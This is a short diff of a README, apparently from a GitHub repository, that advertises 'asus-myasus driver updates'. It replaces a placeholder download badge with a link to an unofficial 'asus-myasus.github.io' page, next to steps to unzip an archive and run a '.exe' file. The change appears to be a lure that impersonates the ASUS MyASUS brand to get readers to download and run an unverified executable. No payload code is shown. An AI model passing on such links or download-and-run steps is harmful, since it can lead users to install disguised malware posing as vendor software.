@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://asus-myasus.github.io/.github/)
 
 ## 📸 Overview
 <img width="1269" height="774" alt="asus-myasus-driver-updates" src="https://github.com/user-attachments/assets/abd9f17b-cb4d-4edf-8a90-a301e8bd4b0c" />
